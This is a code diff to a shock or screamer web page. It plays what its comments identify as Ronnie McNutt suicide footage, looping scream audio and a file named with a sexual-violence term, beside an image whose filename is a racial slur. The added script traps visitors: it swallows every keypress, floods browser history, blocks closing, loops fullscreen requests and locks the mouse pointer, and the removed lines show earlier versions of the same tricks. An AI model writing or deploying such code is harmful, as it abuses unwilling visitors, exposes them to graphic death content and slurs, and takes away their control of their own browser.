@@ -1,6 +1,5 @@
 <html>
 <head>
-<!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-149452514-1"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -34,7 +33,6 @@ body, html {
     cursor: none;
 }
 
-/* Video container for side-by-side layout */
 .video-container {
     position: fixed;
     top: 50%;
@@ -54,27 +52,17 @@ body, html {
     position: relative;
 }
 
-/* Left video (zzart) */
-#fart {
+#fart, #ronnie {
     width: 100%;
     height: 100%;
     object-fit: contain;
     position: absolute;
-    left: 0;
     top: 0;
 }
 
-/* Right video (ronnie mcnutt) */
-#ronnie {
-    width: 100%;
-    height: 100%;
-    object-fit: contain;
-    position: absolute;
-    right: 0;
-    top: 0;
-}
+#fart { left: 0; }
+#ronnie { right: 0; }
 
-/* Center divider */
 .video-divider {
     width: 2px;
     height: 480px;
@@ -84,7 +72,6 @@ body, html {
     transform: translateX(-50%);
 }
 
-/* Click overlay for fullscreen trigger */
 .click-overlay {
     position: fixed;
     top: 0;
@@ -92,6 +79,19 @@ body, html {
     width: 100vw;
     height: 100vh;
     z-index: 9999999;
+    cursor: pointer;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.click-overlay button {
+    padding: 20px 40px;
+    font-size: 20px;
+    background: #fff;
+    color: #000;
+    border: none;
+    border-radius: 0;
     cursor: pointer;
 }
 
@@ -124,296 +124,133 @@ body, html {
 
 </head>
 <body>
-<!-- Click overlay for fullscreen trigger -->
-<div class="click-overlay" onclick="forceFullscreenAndPlay()"></div>
+
+<div class="click-overlay">
+    <button onclick="forceFullscreenAndPlay()">ENTER</button>
+</div>
 <div class="black-screen"></div>
 
 <audio id="shart" preload="auto" loop src="scream.mp3"></audio>
 <audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
 <audio id="shart3" preload="auto" loop src="rape.mp3"></audio>
 
-<!-- Video container with two videos side by side -->
 <div class="video-container">
     <div class="video-wrapper">
-        <video id="fart" loop src="zzart.mp4" muted playsinline></video>
+        <video id="fart" loop src="zzart.mp4" playsinline></video>
     </div>
     <div class="video-divider"></div>
     <div class="video-wrapper">
-        <video id="ronnie" loop src="ronnie.mp4" muted playsinline></video>
+        <video id="ronnie" loop src="ronnie.mp4" playsinline></video>
     </div>
 </div>
 
 <div class="backg"><img src="naggars.gif"></div>
 
 <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
-<script data-cfasync="false" src="http://kekma.net//cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
-
 <script>
-// MAIN VIDEO/AUDIO PLAYBACK ENGINE
 (function() {
     let hasTriggered = false;
     const ORIGINAL_WIDTH = 640;
     const ORIGINAL_HEIGHT = 480;
-    
-    // Override browser audio/video blocking - AGGRESSIVE
-    const originalPlay = HTMLMediaElement.prototype.play;
-    HTMLMediaElement.prototype.play = function() {
-        const promise = originalPlay.call(this);
-        if (promise !== undefined) {
-            promise.catch(error => {
-                console.log('Play blocked, forcing...');
-                this.muted = true;
-                setTimeout(() => {
-                    originalPlay.call(this).catch(() => {
-                        // Create synthetic user interaction
-                        const events = ['click', 'mousedown', 'touchstart', 'keydown'];
-                        events.forEach(eventType => {
-                            const event = new MouseEvent(eventType, {
-                                view: window,
-                                bubbles: true,
-                                cancelable: true
-                            });
-                            document.dispatchEvent(event);
-                        });
-                        setTimeout(() => originalPlay.call(this), 100);
-                    });
-                }, 100);
-            });
-        }
-        return promise;
-    };
 
-    // DISABLE ALL KEYBOARD SHORTCUTS
+    // KEYBOARD LOCKDOWN: Aggressive prevention of escape keys
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'F11' || e.key === 'F12' || e.key === 'Escape' || 
-            (e.altKey && e.key === 'F4') || (e.ctrlKey && e.key === 'w') ||
-            (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.shiftKey && e.key === 'T') ||
-            (e.ctrlKey && e.key === 'q') || (e.ctrlKey && e.key === 'n') ||
-            (e.metaKey && e.key === 'q') || e.key === 'PrintScreen') {
-            e.preventDefault();
-            e.stopPropagation();
-            e.stopImmediatePropagation();
-            return false;
-        }
-    }, true);
-
-    // DISABLE RIGHT-CLICK
-    document.addEventListener('contextmenu', function(e) {
         e.preventDefault();
         e.stopPropagation();
         return false;
     }, true);
 
-    // PREVENT WINDOW CLOSE
-    window.onbeforeunload = function(e) {
-        e.preventDefault();
-        e.returnValue = '';
-        return '';
-    };
+    // CONTEXT MENU LOCKDOWN
+    document.addEventListener('contextmenu', e => e.preventDefault(), true);
 
-    // BLOCK BACK BUTTON
-    history.pushState(null, null, location.href);
+    // NAVIGATION LOCK: Floods history to make "Back" button useless
+    function floodHistory() {
+        for (let i = 0; i < 20; i++) {
+            history.pushState(null, null, location.href);
+        }
+    }
+    
     window.onpopstate = function() {
-        history.pushState(null, null, location.href);
+        floodHistory();
     };
 
-    // PREVENT TAB SWITCHING
-    document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
-            // Re-request attention
-            document.title = '⚠️ ' + document.title;
-            setTimeout(() => {
-                document.title = document.title.replace('⚠️ ', '');
-            }, 1000);
+    // WINDOW CLOSE PREVENTION
+    window.onbeforeunload = function() {
+        return "Are you sure you want to leave?";
+    };
+
+    function attemptFullscreen() {
+        const elem = document.documentElement;
+        if (elem.requestFullscreen) elem.requestFullscreen();
+        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+        else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+    }
+
+    window.forceFullscreenAndPlay = function() {
+        hasTriggered = true;
+        floodHistory();
+
+        const overlay = document.querySelector('.click-overlay');
+        const blackScreen = document.querySelector('.black-screen');
+        if (overlay) overlay.style.display = 'none';
+        if (blackScreen) blackScreen.style.display = 'none';
+        
+        const videos = [document.getElementById('fart'), document.getElementById('ronnie')];
+        const audios = [
+            document.getElementById('shart'),
+            document.getElementById('shart2'),
+            document.getElementById('shart3')
+        ];
+        
+        // ULTRA MAX VOLUME & PLAYBACK
+        const media = [...videos, ...audios];
+        media.forEach(m => {
+            if (m) {
+                m.volume = 1.0;
+                m.muted = false;
+                const playPromise = m.play();
+                if (playPromise !== undefined) {
+                    playPromise.catch(() => {
+                        // Retry loop if browser hiccups
+                        setInterval(() => m.play(), 200);
+                    });
+                }
+            }
+        });
+        
+        // AGGRESSIVE FULLSCREEN LOOP
+        attemptFullscreen();
+        setInterval(attemptFullscreen, 1000);
+
+        // POINTER LOCK: Keeps mouse trapped inside the window
+        document.body.requestPointerLock = document.body.requestPointerLock || 
+                                          document.body.mozRequestPointerLock || 
+                                          document.body.webkitRequestPointerLock;
+        document.body.requestPointerLock();
+    };
+
+    // RE-ENGAGE ON ANY CLICK (In case they manage to exit fullscreen)
+    document.addEventListener('click', () => {
+        if (hasTriggered) {
+            attemptFullscreen();
+            document.body.requestPointerLock();
         }
     });
 
-    // RESIZE VIDEOS TO ORIGINAL SIZE
+    // RESIZE LOGIC
     function resizeVideos() {
         const videoContainer = document.querySelector('.video-container');
-        const videoWrappers = document.querySelectorAll('.video-wrapper');
-        
         if (videoContainer) {
             videoContainer.style.width = (ORIGINAL_WIDTH * 2 + 20) + 'px';
             videoContainer.style.height = ORIGINAL_HEIGHT + 'px';
         }
-        
-        videoWrappers.forEach(wrapper => {
-            wrapper.style.width = ORIGINAL_WIDTH + 'px';
-            wrapper.style.height = ORIGINAL_HEIGHT + 'px';
-        });
     }
 
-    // AGGRESSIVE VIDEO/AUDIO PLAY ATTEMPT
-    function attemptAutoPlay() {
-        if (hasTriggered) return;
-        
-        const videos = [document.getElementById('fart'), document.getElementById('ronnie')];
-        const audios = [
-            document.getElementById('shart'),
-            document.getElementById('shart2'),
-            document.getElementById('shart3')
-        ];
-        
-        // Try direct play first
-        videos.forEach(video => {
-            if (video) {
-                video.muted = false;
-                video.volume = 1.0;
-                video.play().catch(e => {
-                    console.log('Video autoplay failed, will retry on interaction');
-                });
-            }
-        });
-        
-        // Try audio
-        audios.forEach((audio, index) => {
-            if (audio) {
-                audio.volume = 0.8;
-                audio.play().catch(e => {
-                    // Audio will be triggered on interaction
-                });
-            }
-        });
-        
-        // Try fullscreen
-        attemptFullscreen();
-        
-        hasTriggered = true;
-    }
-
-    // FORCE FULLSCREEN
-    function attemptFullscreen() {
-        const elem = document.documentElement;
-        
-        // Multiple fullscreen methods
-        const methods = [
-            () => elem.requestFullscreen().catch(() => {}),
-            () => elem.mozRequestFullScreen().catch(() => {}),
-            () => elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT).catch(() => {}),
-            () => elem.msRequestFullscreen().catch(() => {})
-        ];
-        
-        // Try each method
-        methods.forEach((method, index) => {
-            setTimeout(() => {
-                try {
-                    method();
-                } catch(e) {}
-            }, index * 100);
-        });
-    }
-
-    // MAIN TRIGGER FUNCTION (called on click/interaction)
-    window.forceFullscreenAndPlay = function() {
-        // Remove black screen
-        const blackScreen = document.querySelector('.black-screen');
-        if (blackScreen) blackScreen.style.display = 'none';
-        
-        // Play videos with maximum force
-        const videos = [document.getElementById('fart'), document.getElementById('ronnie')];
-        const audios = [
-            document.getElementById('shart'),
-            document.getElementById('shart2'),
-            document.getElementById('shart3')
-        ];
-        
-        // UNMUTE AND PLAY VIDEOS
-        videos.forEach((video, index) => {
-            if (video) {
-                video.muted = false;
-                video.volume = 1.0;
-                
-                // Multiple play attempts
-                const playAttempt = setInterval(() => {
-                    video.play().then(() => {
-                        clearInterval(playAttempt);
-                    }).catch(e => {
-                        // If still failing, create synthetic events
-                        if (index > 2) {
-                            const event = new MouseEvent('click', { bubbles: true });
-                            document.dispatchEvent(event);
-                        }
-                    });
-                }, 300);
-                
-                // Stop after 5 attempts
-                setTimeout(() => clearInterval(playAttempt), 5000);
-            }
-        });
-        
-        // PLAY AUDIO
-        audios.forEach((audio, index) => {
-            if (audio) {
-                audio.volume = 0.8;
-                const audioAttempt = setInterval(() => {
-                    audio.play().then(() => {
-                        clearInterval(audioAttempt);
-                    }).catch(() => {
-                        // Try unmuting
-                        audio.muted = false;
-                    });
-                }, 400);
-                setTimeout(() => clearInterval(audioAttempt), 5000);
-            }
-        });
-        
-        // FORCE FULLSCREEN
-        const fullscreenAttempt = setInterval(() => {
-            attemptFullscreen();
-        }, 500);
-        setTimeout(() => clearInterval(fullscreenAttempt), 10000);
-        
-        // Lock fullscreen if user tries to exit
-        document.addEventListener('fullscreenchange', lockFullscreen);
-        document.addEventListener('webkitfullscreenchange', lockFullscreen);
-        document.addEventListener('mozfullscreenchange', lockFullscreen);
-        document.addEventListener('MSFullscreenChange', lockFullscreen);
-    };
-    
-    function lockFullscreen() {
-        if (!document.fullscreenElement && 
-            !document.webkitFullscreenElement && 
-            !document.mozFullScreenElement && 
-            !document.msFullscreenElement) {
-            // Re-enter fullscreen immediately
-            setTimeout(attemptFullscreen, 10);
-        }
-    }
-
-    // AUTO ATTEMPT ON LOAD (tries everything automatically)
-    window.addEventListener('load', function() {
+    window.addEventListener('load', () => {
         resizeVideos();
-        
-        // Try autoplay immediately
-        setTimeout(attemptAutoPlay, 100);
-        
-        // Multiple retry attempts
-        for (let i = 1; i <= 10; i++) {
-            setTimeout(attemptAutoPlay, i * 1000);
-        }
-        
-        // Resize check
         setInterval(resizeVideos, 2000);
     });
-
-    // Trigger on any interaction as fallback
-    const events = ['click', 'touchstart', 'mousedown', 'keydown', 'mousemove'];
-    events.forEach(eventType => {
-        document.addEventListener(eventType, function() {
-            if (!hasTriggered) {
-                forceFullscreenAndPlay();
-                hasTriggered = true;
-            }
-        }, { once: true });
-    });
-
-    // Also try periodically
-    setInterval(() => {
-        if (!hasTriggered) {
-            attemptAutoPlay();
-        }
-    }, 3000);
 
 })();
 </script>
